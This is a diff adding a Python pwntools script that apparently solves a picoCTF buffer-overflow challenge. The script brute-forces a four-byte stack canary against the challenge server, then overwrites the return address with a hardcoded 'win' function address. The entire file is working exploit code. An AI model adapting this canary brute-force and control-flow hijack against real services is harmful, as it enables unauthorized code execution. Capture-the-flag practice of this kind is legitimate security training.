@@ -1,0 +1,66 @@
+from pwn import *
+def canary():
+    a=65
+    while a<=122:
+        p=remote("saturn.picoctf.net" ,51406)
+        p.sendline(b"65")
+        pay = b"A" * 64
+        pay+=chr(a).encode()
+        p.sendline(pay)
+        
+        if b"*****" not in p.recvall():
+            print(pay)
+            b=65
+            while b<=122:
+                p=remote("saturn.picoctf.net" ,51406)
+                p.sendline(b"66")
+                pay = b"A" * 64
+                pay+=chr(a).encode()
+                pay+=chr(b).encode()
+                p.sendline(pay)
+                
+                if b"*****" not in p.recvall():
+                    print(pay)
+                    c=65
+                    while c<=122:
+                        p=remote("saturn.picoctf.net" ,51406)
+                        p.sendline(b"67")
+                        pay = b"A" * 64
+                        pay+=chr(a).encode()
+                        pay+=chr(b).encode()
+                        pay+=chr(c).encode()
+
+                        p.sendline(pay)
+                        
+                        if b"*****" not in p.recvall():
+                            print(pay)
+                            d=65
+                            while d<=122:
+                                p=remote("saturn.picoctf.net" ,51406)
+                                p.sendline(b"68")
+                                pay = b"A" * 64
+                                pay+=chr(a).encode()
+                                pay+=chr(b).encode()
+                                pay+=chr(c).encode()
+                                pay+=chr(d).encode()
+                                p.sendline(pay)
+                                
+                                if b"*****" not in p.recvall():
+                                    return pay
+                                p.close()    
+                                d=d+1
+                        p.close()    
+                        c=c+1
+                p.close()    
+                b=b+1
+        p.close()    
+        a=a+1
+kanary=canary()
+print(kanary)
+
+p=remote("saturn.picoctf.net" ,51406)
+kanary+=p32(0)*4
+kanary+=p32(0x8049336) #win address
+p.sendline(b"999")
+p.sendline(kanary)
+p.interactive()
